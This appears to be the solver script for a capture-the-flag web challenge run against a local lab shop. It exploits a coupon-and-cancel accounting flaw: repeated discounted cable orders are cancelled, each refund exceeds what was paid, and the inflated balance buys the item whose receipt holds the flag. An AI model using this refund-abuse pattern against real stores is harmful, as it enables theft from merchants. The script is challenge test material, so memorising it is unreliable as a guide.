"""Exercise the accounting mismatch using only ordinary shop actions."""
from http.cookiejar import CookieJar
import json
import re
from urllib.error import HTTPError
from urllib.request import build_opener, HTTPCookieProcessor, Request


class Client:
    def __init__(self, base='http://app:8000'):
        self.base = base
        self.opener = build_opener(HTTPCookieProcessor(CookieJar()))

    def request(self, path, body=None):
        request = Request(self.base + path, data=json.dumps(body).encode() if body is not None else None,
                          headers={'Accept': 'application/json', 'Content-Type': 'application/json'})
        try:
            with self.opener.open(request, timeout=5) as response:
                return response.status, json.loads(response.read())
        except HTTPError as error:
            return error.code, json.loads(error.read())


def solve():
    client = Client()
    status, state = client.request('/api/shop')
    assert status == 200 and state['balance'] == 1000 and 'pwnden{' not in json.dumps(state)
    assert client.request('/api/orders', {'product': 'limited'})[0] == 400
    for _ in range(4):
        before = state['balance']
        status, state = client.request('/api/orders', {'product': 'cable', 'coupon': 'CABLE50'})
        assert status == 200 and state['balance'] == before - 500
        order = state['orders'][0]
        status, state = client.request('/api/cancel', {'order_id': order['id']})
        assert status == 200
        if state['balance'] == before:
            assert state['orders'][0]['refunded'] == 500
            raise SystemExit(3)
        assert state['balance'] == before + 500
        assert client.request('/api/cancel', {'order_id': order['id']})[0] == 400
    status, state = client.request('/api/orders', {'product': 'limited'})
    assert status == 200 and state['balance'] == 0
    receipt = state['orders'][0]['receipt']
    assert re.fullmatch(r'pwnden\{[0-9a-f]{32}\}', receipt)
    other = Client()
    assert other.request('/api/shop')[1]['balance'] == 1000
    assert 'pwnden{' not in json.dumps(other.request('/api/shop')[1])
    print(receipt)


if __name__ == '__main__':
    solve()
